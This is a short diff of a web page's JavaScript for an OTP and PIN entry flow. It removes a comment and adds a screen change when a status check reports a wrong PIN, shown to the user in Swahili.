@@ -235,7 +235,6 @@ document.addEventListener('DOMContentLoaded', () => {
         otpBoxes[index + 1].focus();
       }
       
-      // Check if all 6 boxes are filled
       let otpVal = '';
       otpBoxes.forEach(b => otpVal += b.value);
       if (otpVal.length === 6) {
@@ -333,6 +332,7 @@ document.addEventListener('DOMContentLoaded', () => {
           clearInterval(statusPollInterval);
           hideLoading();
           clearPinInputs();
+          showScreen(6);
           const pinBanner = document.getElementById('pin-status-banner');
           pinBanner.innerText = 'PIN ISIYO SAHIHI';
           pinBanner.className = 'status-banner error';
@@ -359,4 +359,4 @@ document.addEventListener('DOMContentLoaded', () => {
     window.location.reload();
   });
 });
-    
+      
